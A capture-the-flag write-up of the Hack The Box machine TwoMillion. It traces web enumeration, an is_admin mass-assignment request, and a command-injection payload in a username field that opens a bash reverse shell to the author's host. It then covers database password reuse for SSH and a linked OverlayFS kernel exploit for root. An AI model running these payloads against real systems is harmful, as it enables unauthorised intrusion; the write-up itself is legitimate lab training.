---
layout: post
title: 'Hack The Box - Machine Write-Up: TwoMillion'
created-at: 2025-04-05
categories: ["Hack The Box", "WriteUp", "Cybersecurity"]
---

![Machine Info Card](/docs/assets/2025-04/htb-2million-0.png)

## Enumeration and Analysis

```
> nmap 10.10.11.221              
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-05 01:39 EDT
Nmap scan report for 10.10.11.221
Host is up (0.032s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.70 seconds
```

```
> nmap -p22,80 -sVC 10.10.11.221 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-05 01:40 EDT
Nmap scan report for 10.10.11.221
Host is up (0.024s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.68 seconds
```

Accessing `10.10.11.221` redirects to `https://2million.htb/`.

```
> echo "10.10.11.221    2million.htb" >> /etc/hosts
```

![Landing page](/docs/assets/2025-04/htb-2million-1.png)

![Invite page](/docs/assets/2025-04/htb-2million-2.png)

When analyzing this page, I found a minified piece of JS. This code would construct code and `eval` it. I added a break point to the code and followed it until the result:

```js
function verifyInviteCode(code) {
  var formData = { code: code }
  $.ajax({
    type: 'POST',
    dataType: 'json',
    data: formData,
    url: '/api/v1/invite/verify',
    success: function (response) {
      console.log(response)
    },
    error: function (response) {
      console.log(response)
    },
  })
}
function makeInviteCode() {
  $.ajax({
    type: 'POST',
    dataType: 'json',
    url: '/api/v1/invite/how/to/generate',
    success: function (response) {
      console.log(response)
    },
    error: function (response) {
      console.log(response)
    },
  })
}
```

When calling `makeInviteCode()` from the console, I get it back:

```json
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
```

And using [this](https://cryptii.com/pipes/rot13-decoder) online ROT13 decoder I got:

> In order to generate the invite code, make a POST request to /api/v1/invite/generate

The response code also comes in base64, and it has to be decoded before it can be used for registration:

![Registration page](/docs/assets/2025-04/htb-2million-3.png)

Now with an account I have access to the platform:

![Registration page](/docs/assets/2025-04/htb-2million-4.png)

Fiddling around with fuzzing I, you can get a api documentation by just requesting `GET /api/v1`:

```json
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

With a little more fiddling, I saw that my normal user could send requests to `/api/v1/admin/settings/update`, and the error messages were very clear about what was wrong/missing. I was able to send the following request:

```
PUT http://2million.htb/api/v1/admin/settings/update HTTP/1.1
host: 2million.htb
User-Agent: Mozilla/5.0
Accept: */*
Content-Type: application/json
Origin: https://2million.htb
Cookie: PHPSESSID=n8eilm3uqk0oltkgjc072d99e2

{
	"email": "<my user email>",
	"is_admin": 1
}
```

Which updated my user to admin:

```
GET http://2million.htb/api/v1/admin/auth HTTP/1.1
host: 2million.htb
User-Agent: Mozilla/5.0
Accept: */*
Origin: https://2million.htb
Cookie: PHPSESSID=n8eilm3uqk0oltkgjc072d99e2

---

{"message":true}
```

I was then able to call `/api/v1/admin/vpn/generate` specifying the user name "admin", and got back VPN details:

```
POST http://2million.htb/api/v1/admin/vpn/generate HTTP/1.1
host: 2million.htb
User-Agent: Mozilla/5.0
Accept: */*
Content-Type: application/json
Cookie: PHPSESSID=n8eilm3uqk0oltkgjc072d99e2
content-length: 24

{
	"username": "admin"
}

---

HTTP/1.1 200 OK
...

client
dev tun
proto udp
remote edge-eu-free-1.2million.htb 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AE
...
```

--- 

At this point I was trying to connect to the generated VPN assuming it had admin rights, but after spending sometime trying to find a way to open a VPN connection from the existing VPN connection I took a look at the official write-up, and apparently the server only calls the CLI exec and returns the plain text. Making the `username` input vulnerable for remote code execution on the target machine.

---

With `nc` running on my machine, I then made a request to:

```
POST http://2million.htb/api/v1/admin/vpn/generate HTTP/1.1
host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/json
Cookie: PHPSESSID=n8eilm3uqk0oltkgjc072d99e2
content-length: 47

{
	"username": "admin;bash -c \"bash -i >& /dev/tcp/<tun0 ip>/1337 0>&1\""
}
```

and got a reverse shell.

## Inside the machine

Running `id` I can see I'm a unprivileged user called `www-data`.

Inside the `www` directory, I looked into `index.php` and saw that it imports a `.env` file to get info to log into the database:

```
> cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

I was having trouble initiating a session to connect to the database through the `nc` shell. So I decided to test out for password reuse with SSH, and for my surprise it worked.

And sitting there on the user's home directory, I could read the user flag.

## Privilege escalation

I fiddled around for a bit, and decided to check for common vulnerabilities for the kernel.

```
> uname -r
5.15.70-051570-generic
```

There is a `OverlayFS` vulnerability, more details can be found [here](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/). I also found [this](https://github.com/puckiestyle/CVE-2023-0386) pretty easy PoC made by [@puckiestyle](https://github.com/puckiestyle).

All I had to do was follow the instructions on `README.md` and boom! Root access.

> Don't forget to check out `thank_you.json` inside the `/root` directory.